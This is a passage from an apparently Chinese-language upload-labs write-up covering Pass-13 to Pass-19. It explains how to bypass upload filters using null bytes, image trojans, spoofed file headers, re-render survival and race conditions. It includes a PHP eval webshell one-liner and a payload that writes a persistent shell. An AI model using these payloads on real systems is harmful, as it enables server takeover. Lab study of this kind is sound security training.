<p>\u4e0a\u4e00\u5173\u662f%00\u622a\u65ad\uff0c\u800c\u8fd9\u4e00\u5173\u662f0x00\u622a\u65ad\uff0c\u8fd9\u662f\u4e3a\u5565\uff0c\u56e0\u4e3a\u4e0a\u4e00\u5173\u662fGET\u578b\u7684\uff0c\u76f4\u63a5\u5728url\u4e2d\u7f16\u7801\uff0c\u800c\u8fd9\u4e00\u5173\u662f\u7f16\u7a0b\u8bed\u8a00\u7684\u7f16\u7801</p> </li> <li> <p>\u6211\u4eec\u4f9d\u65e7\u662fBurp\u6293\u5305\u4fee\u6539\uff0c\u4f46\u662f\u4e0d\u662f\u76f4\u63a5\u5199\u4e3a<code>.php0x00</code>\uff0c\u4e0b\u56fe\u4e3a\u9519\u8bef\u793a\u4f8b\uff1a</p> </li> </ol> <p></p> <ol> <li> <p>\u8fd9\u91cc\u5176\u5b9e\u5e94\u8be5\u5199\u4e3a1.php (php\u540e\u9762\u6709\u4e00\u4e2a\u7a7a\u683c)\uff0c\u7136\u540e\u9009\u4e2d\u8fd9\u4e2a\u7a7a\u683c\uff08\u989d\u2026\u2026wo\u771f\u7684\u9009\u4e2d\u4e86\uff0c\u8fd9\u4e2aBurp\u663e\u793a\u6709\u95ee\u9898\uff09\u7136\u540e\u5728\u53f3\u8fb9\uff0c\u5c06hex\u5185\u5bb9\u6539\u4e3a00\uff0c\u70b9\u51fb\u201c\u5e94\u7528\u4fee\u6539\u201d\uff0c\u653e\u884c\u62e6\u622a\u5230\u7684\u6570\u636e\u5305\u5373\u53ef</p> </li> <li> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff1a\u56e0\u4e3a\u662f POST \u578b\uff0c\u6240\u4ee5\u9700\u8981\u5728 16 \u8fdb\u5236\u4e2d\u4fee\u6539\uff0c\u56e0\u4e3a POST \u4e0d\u4f1a\u50cf GET \u90a3 \u6837\u5bf9%00 \u8fdb\u884c\u81ea\u52a8\u89e3\u7801\u3002</p> </li> </ol>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-14","title":"Pass-14 \u6587\u4ef6\u5185\u5bb9\u68c0\u6d4b (\u6587\u4ef6\u5934\u6821\u9a8c)","text":"<p>\u5148\u4e86\u89e3\u4e86\u89e3\u6587\u4ef6\u5934\uff1a JPEG/JFIF(\u5e38\u89c1\u7684\u7167\u7247\u683c\u5f0f): \u5934\u4e24\u4e2a\u5b57\u8282\u4e3a\u00b70xFF\u00b70xD8 PNG(\u65e0\u635f\u538b\u7f29\u683c\u5f0f):\u5934\u4e24\u4e2a\u5b57\u8282\u4e3a\u00b70x89\u00b70x50 GIF (\u652f\u6301\u52a8\u753b\u7684\u56fe\u50cf\u683c\u5f0f): \u5934\u4e24\u4e2a\u5b57\u8282\u4e3a\u00b70x47\u00b70x49 BMP(Windows\u4f4d\u56fe\u683c\u5f0f): \u5934\u4e24\u4e2a\u5b57\u8282\u4e3a\u00b70x42\u00b70x4D TIFF (\u6807\u7b7e\u56fe\u50cf\u6587\u4ef6\u683c\u5f0f): \u5934\u4e24\u4e2a\u5b57\u8282\u53ef\u4ee5\u662f\u4e0d\u540c\u7684\u6570\u503c</p> <ol> <li>\u6211\u4eec\u770b\u770b\u540e\u7aef\u4ee3\u7801\uff1a</li> </ol> <p>PHP<pre><code>function getReailFileType($filename){\n    $file = fopen($filename, \"rb\");\n    $bin = fread($file, 2); //\u53ea\u8bfb2\u5b57\u8282\n    fclose($file);\n    $strInfo = @unpack(\"C2chars\", $bin);    \n    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    \n    $fileType = '';    \n    switch($typeCode){      \n        case 255216:            \n            $fileType = 'jpg';\n            break;\n        case 13780:            \n            $fileType = 'png';\n            break;        \n        case 7173:            \n            $fileType = 'gif';\n            break;\n        default:            \n            $fileType = 'unknown';\n        }    \n        return $fileType;\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $file_type = getReailFileType($temp_file);\n\n    if($file_type == 'unknown'){\n        $msg = \"\u6587\u4ef6\u672a\u77e5\uff0c\u4e0a\u4f20\u5931\u8d25\uff01\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"\u4e0a\u4f20\u51fa\u9519\uff01\";\n        }\n    }\n}\n</code></pre> \u5176\u4e2d <code>$file = fopen($filename, \"rb\");</code>\u8868\u793a\u4ee5\u53ea\u8bfb\uff08r\uff09\u3001\u4e8c\u8fdb\u5236\uff08b\uff09\u683c\u5f0f\u6253\u5f00\u6587\u4ef6\uff0c\u7136\u540e<code>$bin = fread($file, 2);</code> \u53ea\u8bfb2\u5b57\u8282\uff0c\u518d\u4e4b\u540e\uff0c\u5c06\u5176\u8f6c\u6362\u4e3a\u5341\u8fdb\u5236\u7f16\u7801\u4e0e\u6587\u4ef6\u5934\u8fdb\u884c\u6bd4\u8f83\u4ece\u800c\u5f97\u77e5\u6587\u4ef6\u7c7b\u578b\u3002</p> <ol> <li>\u8fd9\u4e2a\u53ef\u4ee5\u7528\u4e24\u79cd\u65b9\u6cd5\u89e3\u51b3\uff1a <p>\u7b2c\u4e00\u79cd\uff1a \u5728 cmd \u91cc\u6267\u884c copy logo.jpg/b+test.php/a   test.jpg logo.jpg \u4e3a\u4efb\u610f\u56fe\u7247 test.php \u4e3a\u6211\u4eec\u8981\u63d2\u5165\u7684\u6728\u9a6c\u4ee3\u7801 test.jpg \u4e3a\u6211\u4eec\u8981\u521b\u5efa\u7684\u56fe\u7247\u9a6c</p> </li> </ol> <p>\u7b2c\u4e8c\u79cd\uff1a \u76f4\u63a5\u7528010editor\u7b49\u8f6f\u4ef6\u8fdb\u884c\u4fee\u6539</p> <ol> <li>\u4f46\u5176\u5b9e\u8fd9\u65f6\u5019\u7528\u8681\u5251\u8fde\u63a5\u4e5f\u65e0\u6cd5\u8fde\u63a5\uff0c\u56e0\u4e3a\u5b83\u4ecd\u7136\u662f\u88ab\u5f53\u4f5c\u56fe\u7247\u7b49\u683c\u5f0f\u89e3\u6790\u7684\uff0c\u6211\u4eec\u770b\u4e00\u770bupload-labs\u7684\u5173\u5361\u754c\u9762\uff0c\u5b83\u8bf4\u8981\u201c\u4f7f\u7528\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u80fd\u8fd0\u884c\u56fe\u7247\u9a6c\u4e2d\u7684\u6076\u610f\u4ee3\u7801\u201d\uff0c\u6240\u4ee5\u6211\u4eec\u4f7f\u7528\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5373\u53ef</li> </ol>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-15-getimagesize","title":"Pass-15 \u6587\u4ef6\u5185\u5bb9\u68c0\u6d4b (getimagesize()\u6821\u9a8c)","text":"<ol> <li>\u89c2\u5bdf\u6e90\u7801\uff1a</li> </ol> <p>PHP<pre><code>function isImage($filename){\n    $types = '.jpeg|.png|.gif';\n    if(file_exists($filename)){\n        $info = getimagesize($filename);\n        $ext = image_type_to_extension($info[2]);\n        if(stripos($types,$ext)&gt;=0){\n            return $ext;\n        }else{\n            return false;\n        }\n    }else{\n        return false;\n    }\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $res = isImage($temp_file);\n    if(!$res){\n        $msg = \"\u6587\u4ef6\u672a\u77e5\uff0c\u4e0a\u4f20\u5931\u8d25\uff01\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"\u4e0a\u4f20\u51fa\u9519\uff01\";\n        }\n    }\n}\n</code></pre> 2. \u8fd9\u5173\u4e0e\u4e0a\u4e00\u5173\u7c7b\u4f3c\uff0c\u4f46\u662f\u5b83\u662f\u7528<code>getimagesize()</code>\u5bf9\u56fe\u7247\u505a\u4e86\u6821\u9a8c\u3002\u5176\u4f59\u64cd\u4f5c\u76f8\u540c\u3002</p> <p>getimagesize() \u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u56fe\u50cf\u4fe1\u606f\u7684\u6570\u7ec4\u3002\u8be5\u6570\u7ec4\u7684\u7d22\u5f15\u5982\u4e0b\u6240\u793a: </p> <p>\u7d22\u5f150: \u56fe\u50cf\u7684\u5bbd\u5ea6 (\u5355\u4f4d:\u50cf\u7d20) \u7d22\u5f151: \u56fe\u50cf\u7684\u9ad8\u5ea6 (\u5355\u4f4d:\u50cf\u7d20) \u7d22\u5f152: \u56fe\u50cf\u7c7b\u578b\u7684\u5e38\u91cf\u503c(\u53ef\u4ee5\u4f7f\u7528 image type to_mimetype() \u51fd\u6570\u5c06\u5176\u8f6c\u6362\u4e3a MIME \u7c7b\u578b),\u578b\uff0c\u8fd4\u56de\u7684\u662f\u6570\u5b57,\u5176\u4e2d1 = GIF\uff0c2 = JPG\uff0c3 = PNG\uff0c4 = SWF\uff0c5 = PSD\uff0c6 = BMP\uff0c7 = TIFF(intel byte order)\uff0c8 = TIFF(motorola byte order)\uff0c9 = JPC\uff0c10 = JP2\uff0c11 = JPX\uff0c12 = JB2\uff0c13 = SWC\uff0c14 = IFF\uff0c15 = WBMP\uff0c16 = XBM \u7d22\u5f153: \u5305\u542b\u56fe\u50cf\u5c5e\u6027\u7684\u5b57\u7b26\u4e32\uff0c\u4ee5\u9017\u53f7\u5206\u9694 (\u5982width=500,height=300) \u7d22\u5f15 bits \u7ed9\u51fa\u7684\u662f\u56fe\u50cf\u7684\u6bcf\u79cd\u989c\u8272\u7684\u4f4d\u6570\uff0c\u4e8c\u8fdb\u5236\u683c\u5f0f \u7d22\u5f15 channels \u7ed9\u51fa\u7684\u662f\u56fe\u50cf\u7684\u901a\u9053\u503c\uff0cRGB \u56fe\u50cf\u9ed8\u8ba4\u662f 3 \u7d22\u5f15 mime \u7ed9\u51fa\u7684\u662f\u56fe\u50cf\u7684 MIME \u4fe1\u606f\uff0c\u6b64\u4fe1\u606f\u53ef\u4ee5\u7528\u6765\u5728 HTTP Content-type \u5934\u4fe1\u606f\u4e2d\u53d1\u9001\u6b63\u786e\u7684\u4fe1\u606f  \u5982\u679cgetimagesize()\u51fd\u6570\u65e0\u6cd5\u8bfb\u53d6\u56fe\u50cf\u4fe1\u606f\uff0c\u5219\u8fd4\u56defalse\u3002\u5426\u5219\uff0c\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u4e0a\u8ff0\u7d22\u5f15\u7684\u6570\u7ec4\u3002</p>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-16-exif_imagetype","title":"Pass-16 \u6587\u4ef6\u5185\u5bb9\u68c0\u6d4b (exif_imagetype()\u7ed5\u8fc7)","text":"<ol> <li>\u6f0f\u6d1e\u63cf\u8ff0\uff1a\u5229\u7528 php \u5185\u7f6e\u51fd\u6570 exif_imagetype()\u83b7\u53d6\u56fe\u7247\u7c7b\u578b (\u9700\u8981\u5f00\u542f php_exif \u6a21\u5757)</li> <li> <p>\u9884\u5b9a\u4e49\u9ad8\u5ea6\u5bbd\u5ea6\uff1a \u4f8b .htaccess \u6587\u4ef6 \u6587\u4ef6\u5185\u5bb9:</p> </li> <li> <p>\u5229\u7528 x00x00x8ax39x8ax39 \u6587\u4ef6\u5934x00x00x8ax30x8ax39 \u662f wbmp \u6587\u4ef6\u7684\u6587\u4ef6\u5934\uff0c\u4f46 0x00\u5728.htaccess \u6587\u4ef6\u4e2d\u4e3a\u662f\u6ce8\u91ca\u7b26\uff0c\u4e0d\u4f1a\u5f71\u54cd\u6587\u4ef6\u672c\u8eab\u3002\u4f7f\u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u6216\u8005 python \u7684 bytes \u5b57\u7b26\u7c7b\u578b(b\u2019\u2019)\u6765\u8fdb\u884c\u6dfb\u52a0\u3002 payload:shell = b\"\\x00\\x00\\x8a\\x39\\x8a\\x39\"+b\"00\" + '\u6587\u4ef6\u5185\u5bb9'</p> </li> <li>\u5176\u5b9e\u5176\u4ed6\u64cd\u4f5c\u548c\u524d\u51e0\u5173\u4e00\u6837</li> </ol>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-17","title":"Pass-17 \u6587\u4ef6\u5185\u5bb9\u68c0\u6d4b (\u4e8c\u6b21\u6e32\u67d3)","text":"<ol> <li>\u67e5\u770b\u6e90\u7801\uff1a</li> </ol> <p>PHP<pre><code>$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])){\n    // \u83b7\u5f97\u4e0a\u4f20\u6587\u4ef6\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u6587\u4ef6\u540d\uff0c\u7c7b\u578b\uff0c\u5927\u5c0f\uff0c\u4e34\u65f6\u6587\u4ef6\u8def\u5f84\n    $filename = $_FILES['upload_file']['name'];\n    $filetype = $_FILES['upload_file']['type'];\n    $tmpname = $_FILES['upload_file']['tmp_name'];\n\n    $target_path=UPLOAD_PATH.'/'.basename($filename);\n\n    // \u83b7\u5f97\u4e0a\u4f20\u6587\u4ef6\u7684\u6269\u5c55\u540d\n    $fileext= substr(strrchr($filename,\".\"),1);\n\n    //\u5224\u65ad\u6587\u4ef6\u540e\u7f00\u4e0e\u7c7b\u578b\uff0c\u5408\u6cd5\u624d\u8fdb\u884c\u4e0a\u4f20\u64cd\u4f5c\n    if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\")){\n        if(move_uploaded_file($tmpname,$target_path)){\n            //\u4f7f\u7528\u4e0a\u4f20\u7684\u56fe\u7247\u751f\u6210\u65b0\u7684\u56fe\u7247\n            $im = imagecreatefromjpeg($target_path);\n\n            if($im == false){\n                $msg = \"\u8be5\u6587\u4ef6\u4e0d\u662fjpg\u683c\u5f0f\u7684\u56fe\u7247\uff01\";\n                @unlink($target_path);\n            }else{\n                //\u7ed9\u65b0\u56fe\u7247\u6307\u5b9a\u6587\u4ef6\u540d\n                srand(time());\n                $newfilename = strval(rand()).\".jpg\";\n                //\u663e\u793a\u4e8c\u6b21\u6e32\u67d3\u540e\u7684\u56fe\u7247\uff08\u4f7f\u7528\u7528\u6237\u4e0a\u4f20\u56fe\u7247\u751f\u6210\u7684\u65b0\u56fe\u7247\uff09\n                $img_path = UPLOAD_PATH.'/'.$newfilename;\n                imagejpeg($im,$img_path);\n                @unlink($target_path);\n                $is_upload = true;\n            }\n        } else {\n            $msg = \"\u4e0a\u4f20\u51fa\u9519\uff01\";\n        }\n\n    }else if(($fileext == \"png\") &amp;&amp; ($filetype==\"image/png\")){\n        if(move_uploaded_file($tmpname,$target_path)){\n            //\u4f7f\u7528\u4e0a\u4f20\u7684\u56fe\u7247\u751f\u6210\u65b0\u7684\u56fe\u7247\n            $im = imagecreatefrompng($target_path);\n\n            if($im == false){\n                $msg = \"\u8be5\u6587\u4ef6\u4e0d\u662fpng\u683c\u5f0f\u7684\u56fe\u7247\uff01\";\n                @unlink($target_path);\n            }else{\n                 //\u7ed9\u65b0\u56fe\u7247\u6307\u5b9a\u6587\u4ef6\u540d\n                srand(time());\n                $newfilename = strval(rand()).\".png\";\n                //\u663e\u793a\u4e8c\u6b21\u6e32\u67d3\u540e\u7684\u56fe\u7247\uff08\u4f7f\u7528\u7528\u6237\u4e0a\u4f20\u56fe\u7247\u751f\u6210\u7684\u65b0\u56fe\u7247\uff09\n                $img_path = UPLOAD_PATH.'/'.$newfilename;\n                imagepng($im,$img_path);\n\n                @unlink($target_path);\n                $is_upload = true;               \n            }\n        } else {\n            $msg = \"\u4e0a\u4f20\u51fa\u9519\uff01\";\n        }\n\n    }else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\")){\n        if(move_uploaded_file($tmpname,$target_path)){\n            //\u4f7f\u7528\u4e0a\u4f20\u7684\u56fe\u7247\u751f\u6210\u65b0\u7684\u56fe\u7247\n            $im = imagecreatefromgif($target_path);\n            if($im == false){\n                $msg = \"\u8be5\u6587\u4ef6\u4e0d\u662fgif\u683c\u5f0f\u7684\u56fe\u7247\uff01\";\n                @unlink($target_path);\n            }else{\n                //\u7ed9\u65b0\u56fe\u7247\u6307\u5b9a\u6587\u4ef6\u540d\n                srand(time());\n                $newfilename = strval(rand()).\".gif\";\n                //\u663e\u793a\u4e8c\u6b21\u6e32\u67d3\u540e\u7684\u56fe\u7247\uff08\u4f7f\u7528\u7528\u6237\u4e0a\u4f20\u56fe\u7247\u751f\u6210\u7684\u65b0\u56fe\u7247\uff09\n                $img_path = UPLOAD_PATH.'/'.$newfilename;\n                imagegif($im,$img_path);\n\n                @unlink($target_path);\n                $is_upload = true;\n            }\n        } else {\n            $msg = \"\u4e0a\u4f20\u51fa\u9519\uff01\";\n        }\n    }else{\n        $msg = \"\u53ea\u5141\u8bb8\u4e0a\u4f20\u540e\u7f00\u4e3a.jpg|.png|.gif\u7684\u56fe\u7247\u6587\u4ef6\uff01\";\n    }\n}\n</code></pre> 2. \u5728\u6e90\u7801\u4e2d\u6709\u8fd9\u4e48\u4e00\u53e5\u6bd4\u8f83\u7279\u6b8a\uff0c\u4e5f\u662f\u8fd9\u4e00\u5173\u7684\u91cd\u70b9\uff1a <code>$im = imagecreatefrompng($target_path);</code>\u8fd9\u4e2a\u7684\u610f\u601d\u662f\u5bf9\u56fe\u7247\u8fdb\u884c\u91cd\u65b0\u6e32\u67d3\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5c06\u56fe\u7247\u683c\u5f0f\u4e4b\u5916\u7684\u5185\u5bb9\u4f1a\u88ab\u5220\u53bb\uff0c\u5c31\u6bd4\u5982\u8bf4\u6211\u4eec\u4e4b\u524d\u7528 cmd \u91cc\u6267\u884c <code>copy logo.jpg/b+test.php/a test.jpg</code>\u751f\u6210\u7684\u56fe\u7247\uff0c\u5176\u6587\u4ef6\u672b\u5c3e\u4f1a\u6709php\u8bed\u53e5\uff0c\u800c\u5728\u4e8c\u6b21\u6e32\u67d3\u4e4b\u540e\u5c31\u4f1a\u6d88\u5931\u3002</p> <ol> <li> <p>\u57fa\u4e8e\u6b64\uff0c\u6211\u4eec\u5c1d\u8bd5\u53bb\u7ed5\u8fc7\uff0c\u6211\u4eec\u5148\u4e0a\u4f20\u4e00\u4e2a\u5408\u6cd5\u7684gif\u6587\u4ef6\uff0c\uff08\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u7528.gif \u800c\u4e0d\u7528.jpg \u6216\u8005\u662f.png ,\u6211\u4eec\u4e4b\u540e\u518d\u8bf4\uff09\uff0c\u4e0a\u4f20\u4e4b\u540e\uff0c\u6211\u4eec\u5728\u9875\u9762\u4e0a\u53f3\u952e\u56fe\u7247\uff0c\u7136\u540e\u5c06\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u7684\u56fe\u7247\u4e0b\u8f7d\u5230\u672c\u5730\u3002</p> </li> <li> <p>\u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u5148\u6bd4\u8f83\u6bd4\u8f83\u7ecf\u8fc7\u6e32\u67d3\u4e4b\u540e\u7684\u56fe\u7247\u4e0e\u539f\u56fe\u7247\u6709\u4f55\u533a\u522b\uff0c\u6211\u4eec\u6253\u5f00010editor\uff0c\u7136\u540e\u9009\u62e9\u201c\u6bd4\u8f83\u6587\u4ef6\u201d\uff0c\u5206\u522b\u9009\u62e9\u4e24\u5f20\u56fe\u7247\uff0c\u518d\u70b9\u51fb\u201c\u5339\u914d\u201d\uff0c\u7136\u540e\u518d\u5176\u4e2d\u63d2\u5165\u4e1c\u897f\u3002</p> </li> </ol> <p></p> <ol> <li> <p>\u8fd9\u65f6\u5019\u6211\u4eec\u6709\u4e24\u79cd\u65b9\u6cd5\uff0c\u4e00\u79cd\u662f\u5728\u6700\u521d\u7684\u56fe\u7247\u4e0a\u505a\u4fee\u6539\uff0c\u7b2c\u4e8c\u79cd\u662f\u5728\u7ecf\u8fc7\u7b2c\u4e00\u6b21\u6e32\u67d3\u4e4b\u540e\u7684\u56fe\u7247\u4e0a\u505a\u4fee\u6539</p> </li> <li> <p>\u5148\u8bf4\u7b2c\u4e00\u79cd\uff0c\u6211\u4eec\u5c06\u6211\u4eec\u7684PHP\u8bed\u53e5\u63d2\u5165\u5230\u672a\u7ecf\u4fee\u6539\u7684\u90e8\u5206\uff08\u6700\u597d\u9760\u540e\u4e00\u4e9b\uff09\uff0c\u7136\u540e\u518d\u5c06\u63d2\u5165php\u8bed\u53e5\u7684\u7167\u7247\u4e0a\u4f20\u3002\u518d\u6b21\u4e0b\u8f7d\u4e0b\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u7684\u7167\u7247\u53ef\u4ee5\u53d1\u73b0\u91cc\u9762\u7684PHP\u8bed\u53e5\u5e76\u6ca1\u6709\u88ab\u5220\u9664\u3002    </p> </li> <li> <p>\u7b2c\u4e8c\u79cd\uff1a\u63d2\u5165\u5230\u7ecf\u8fc7\u7b2c\u4e00\u6b21\u6e32\u67d3\u4e4b\u540e\u7684\u7167\u7247\u91cc\uff0c\u8fd9\u91cc\u7684\u6e32\u67d3\u53ea\u4f1a\u8fdb\u884c\u4e00\u6b21\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6e32\u67d3\u8fc7\u540e\u7684\u7167\u7247\u518d\u4e0a\u4f20\u65f6\u5e76\u4e0d\u4f1a\u518d\u6b21\u88ab\u6e32\u67d3\uff0c\u6240\u4ee5\u6211\u4eec\u7684PHP\u8bed\u53e5\u4e5f\u5f97\u4ee5\u88ab\u4fdd\u7559\u3002</p> </li> <li> <p>\u8fd9\u91cc\u8bf4\u8bf4\u4e3a\u4ec0\u4e48\u8981\u7528.gif \u5427\uff1a\u5982\u679c\u6211\u4eec\u7528.jpg \u6216\u8005.png\u7684\u8bdd\uff0c\u7ecf\u8fc7\u7b2c\u4e00\u6b21\u6e32\u67d3\u4e4b\u540e\u7684\u56fe\u7247\u4e0e\u539f\u56fe\u7247\u76f8\u540c\u7684\u533a\u57df\u975e\u5e38\u5c11\uff0c\u4ece\u800c\u4e5f\u5c31\u4e0d\u9002\u5408\u6211\u4eec\u63d2\u5165\u8bed\u53e5\u3002\u4f46\u662f\u5982\u679c\u975e\u8981\u7528.jpg \u6216\u8005.png\u7684\u8bdd\uff0c\u90a3\u5c31\u9700\u8981\u7ecf\u8fc7\u4e00\u4e9b\u7f16\u7a0b\u7684\u64cd\u4f5c\u4e86\uff0c\u672c\u8282\u4e0d\u5bf9\u6b64\u505a\u8bba\u8ff0\u3002</p> </li> </ol>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-18","title":"Pass-18 \u903b\u8f91\u6f0f\u6d1e (\u6761\u4ef6\u7ade\u4e89)","text":"<ol> <li>\u8fd9\u6837\u7406\u89e3\u6761\u4ef6\u7ade\u4e89\uff1a\u5982\u679c\u53ea\u8ba9\u4f60\u5e72A\u4e00\u4ef6\u4e8b\uff0c\u4f60\u51fa\u73b0\u5dee\u9519\u7684\u6982\u7387\u5f88\u5c0f\uff0c\u4f46\u662f\u5982\u679c\u8ba9\u4f60\u540c\u65f6\u5e72A\u3001B\u3001C\u4e09\u79cd\u4e8b\u5462\uff0c\u4f60\u662f\u4e0d\u662f\u5f88\u53ef\u80fd\u7531\u4e8e\u5fd9\u4e71\u800c\u51fa\u73b0\u4e9b\u9519\u8bef\uff1f\u8fd9\u5c31\u662f\u6761\u4ef6\u7ade\u4e89\u3002\uff08\u5b83\u7684\u91cd\u547d\u540d\u65b9\u5f0f\u662f\u65f6\u95f4\u6233\uff0c\u5982\u679c\u5728\u6781\u77ed\u65f6\u95f4\u5185\u591a\u6b21\u4e0a\u4f20\uff0c\u6587\u4ef6\u7684\u91cd\u547d\u540d\u5c31\u4f1a\u56e0\u4e3a\u76f8\u540c\u800c\u51b2\u7a81\uff0c\u5c31\u4f1a\u4ea7\u751f\u4e00\u4e9b\u9519\u8bef\uff09</li> </ol> <p>\u6587\u4ef6\u4e0a\u4f20\u6761\u4ef6\u7ade\u4e89\u524d\u63d0\uff1a \u670d\u52a1\u5668\u4f1a\u5148\u5c06\u4efb\u610f\u7c7b\u578b\u6587\u4ef6\u653e\u5728\u670d\u52a1\u5668\u4e0a\uff0c\u7136\u540e\u518d\u5224\u65ad\u5408\u6cd5\u6027\uff0c\u975e\u6cd5\u5219\u5220\u9664\uff08\u6587\u4ef6\u4f1a\u5728\u670d\u52a1\u5668\u505c\u7559\u6781\u77ed\u65f6\u95f4\uff0c\u6211\u4eec\u4f7f\u7528Burp\u75af\u72c2\u5730\u5411\u670d\u52a1\u5668\u63d0\u4ea4\u8bf7\u6c42\uff0c\u5728\u5176\u670d\u52a1\u5668\u5fd9\u4e0d\u8fc7\u6765\u7684\u65f6\u5019\u4fbf\u53ef\u80fd\u4f1a\u51fa\u73b0\u8fd9\u79cd\u95ee\u9898\uff09</p> <ol> <li> <p>\u7531\u4e8e\u6211\u4eec\u9700\u8981\u957f\u4e45\u7684\u8fde\u63a5\u5230\u6211\u4eec\u7684\u6728\u9a6c\uff0c\u4f46\u662f\u5176\u53ea\u80fd\u5728\u670d\u52a1\u5668\u4e0a\u5b58\u5728\u6781\u77ed\u65f6\u95f4\uff0c\u8fd9\u80af\u5b9a\u662f\u4e0d\u884c\u7684\u3002\u4f46\u662f\uff0c\u6781\u77ed\u65f6\u95f4\u53ef\u4ee5\u6267\u884c\u4e00\u53e5\u4ee3\u7801\uff0c\u6267\u884c\u4ec0\u4e48\u5462\uff0c\u5982\u4e0b\uff1a<code>&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[\"cmd\"]) ?&gt;'); ?&gt;</code>\uff0c\u8fd9\u53e5\u8bdd\u7684\u610f\u601d\u662f\u751f\u6210\u4e00\u4e2ashell.php\u5728\u670d\u52a1\u5668\u76ee\u5f55\u4e2d\uff0c\u800c\u5176\u6587\u4ef6\u5185\u5bb9\u5c31\u662f\uff1a<code>&lt;?php @eval($_POST[\"cmd\"]) ?&gt;</code>\uff0c\u5728\u6b64\u4e4b\u540e\uff0c\u4e0a\u4f20\u7684\u6587\u4ef6\u5224\u65ad\u540e\u4ecd\u4f1a\u88ab\u5220\u9664\uff0c\u4f46\u662f\u65b0\u521b\u5efa\u7684shell.php\u5e76\u4e0d\u4f1a\u88ab\u5224\u65ad\u800c\u5220\u9664\u3002</p> </li> <li> <p>\u7406\u8bba\u7ed3\u675f\uff0c\u5f00\u59cb\u64cd\u4f5c\uff0c\u6211\u4eec\u5148\u5199\u4e00\u4e2aphp\u6587\u4ef6\uff0c\u5176\u5185\u5bb9\u5c31\u662f<code>&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[\"cmd\"]) ?&gt;'); ?&gt;</code>\uff0c\u7136\u540e\u4e0a\u4f20\uff0c\u7528Burp\u62e6\u622a\uff0c\u53d1\u9001\u5230Intruder\u6a21\u5757\uff0c\u8bbe\u7f6e\u7a7a\u8f7d\uff0c\u7136\u540e\u8ba9Burp\u5f00\u59cb\u8dd1\u3002</p> </li> </ol> <p> </p> <ol> <li>\uff08\u8fd0\u6c14\u597d\u7684\u8bdd\uff09\u670d\u52a1\u5668\u4e0a\u4f1a\u6210\u529f\u51fa\u73b0shell.php</li> </ol>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-19-apache","title":"Pass-19 \u903b\u8f91\u6f0f\u6d1e (\u6761\u4ef6\u7ade\u4e89-Apache\u89e3\u6790\u6f0f\u6d1e)","text":"<ol> <li>\u8fd9\u5173\u4e5f\u662f\u6761\u4ef6\u7ade\u4e89\uff0c\u4f46\u662f\u6709\u4e2a\u533a\u522b\u5c31\u662f\uff0c\u4ed6\u5bf9\u540e\u7f00\u540d\u505a\u4e86\u767d\u540d\u5355\u5224\u65ad\uff0c\u7136\u540e\u4f1a\u4e00\u6b65\u4e00\u6b65\u68c0\u67e5\u6587\u4ef6\u5927\u5c0f\u3001\u6587\u4ef6\u662f\u5426\u5b58\u5728\u7b49\u7b49\uff0c\u6ee1\u8db3\u4e4b\u540e\uff0c\u624d\u4f1a\u5c06\u6587\u4ef6\u4e0a\u4f20\u540e\u81f3\u670d\u52a1\u5668\uff0c\u5bf9\u6587\u4ef6\u91cd\u65b0\u547d\u540d\uff0c\u540c\u6837\u5b58\u5728\u6761\u4ef6\u7ade\u4e89\u7684\u6f0f\u6d1e\u3002</li> <li>\u8fd9\u91cc\u6211\u4eec\u5148\u4e86\u89e3\u4e00\u4e0bApache\u7684\u89e3\u6790\u6f0f\u6d1e\uff0c\u5728\u6211\u4eec\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0c\u5c31\u6bd4\u5982\u8bf4\u662f1.php.7z  